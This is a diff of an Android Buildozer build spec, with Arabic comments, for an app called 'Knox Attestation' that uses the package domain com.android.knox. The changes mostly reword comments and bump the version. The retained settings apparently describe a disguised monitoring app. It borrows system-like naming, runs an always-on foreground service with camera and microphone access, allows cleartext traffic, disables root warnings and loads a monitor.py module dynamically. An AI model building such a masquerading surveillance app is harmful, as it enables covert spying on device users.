@@ -1,7 +1,9 @@
 [app]
-# الهوية الأساسية للتطبيق
+# اسم التطبيق الظاهر للمستخدم
 title = Knox Attestation
+# اسم الحزمة الداخلي (package)
 package.name = knoxattest
+# النطاق البرمجي
 package.domain = com.android.knox
 
 # المصادر
@@ -10,13 +12,14 @@ source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db,tflite
 source.include_patterns = assets/*, *.tflite
 source.exclude_dirs = tests,__pycache__,docs,.github
 
-# ✅ تم رفع الإصدار لضمان تحديث نظيف وتجنب تعارض البيانات القديمة
-version = 2.6.0
+# ✅ رفع الإصدار لضمان تحديث نظيف (بدون تعارض مع بيانات الإصدارات السابقة)
+version = 2.6.1
 
-# ✅ المتطلبات الخفيفة - tflite-runtime (بدلاً من tensorflow الكامل)
+# ✅ المتطلبات البرمجية الخفيفة (بدون opencv-python للحفاظ على حجم APK صغير)
+# تم استخدام tflite-runtime لتشغيل نموذج NSFW، و pillow لمعالجة الصور الأساسية
 requirements = python3,kivy==2.3.0,requests,urllib3,certifi,pillow,pyjnius,android,cryptography,pyzipper,numpy,tflite-runtime
 
-# أيقونة التطبيق (تأكد من وجود الملف أو علق السطر)
+# أيقونة التطبيق (اذكر مسارها أو علق السطر إذا لم تكن موجودة)
 icon.filename = %(source.dir)s/res/drawable/ic_launcher.png
 
 # الصلاحيات المطلوبة
@@ -31,26 +34,26 @@ android.build_tools_ver = 33.0.0
 android.accept_sdk_license = True
 android.archs = arm64-v8a
 
-# ✅ منع التعارض: يمنع استعادة بيانات قديمة قد تسبب تعطل المصادقة
+# ✅ منع التعارض مع بيانات النسخ القديمة
 android.allow_backup = False
 android.request_legacy_external_storage = True
 
-# إعدادات الخدمة والتشغيل (لضمان عدم إغلاق التطبيق في الخلفية)
+# ✅ تشغيل الخدمة في المقدمة (Foreground) لضمان عدم إغلاق التطبيق في الخلفية
 android.foreground = True
 android.foreground_service_type = dataSync|camera|microphone
 android.wakelock = True
 android.uses_cleartext_traffic = True
 
-# معلومات إضافية (Knox) – اختيارية
+# بيانات تعريفية إضافية (خاصة بـ Knox)
 android.meta_data = com.samsung.android.knox.intent.action.KNOX_ATTESTATION=true
 
-# عرض التطبيق
+# إعدادات الشاشة والعرض
 orientation = portrait
 fullscreen = 1
 log_level = 2
 warn_on_root = 0
 
-# تم حذف android.services لأن monitor.py يُحمّل ديناميكياً
+# تم حذف سطر android.services لأن monitor.py يُحمَّل ديناميكياً
 
 [buildozer]
 log_level = 2
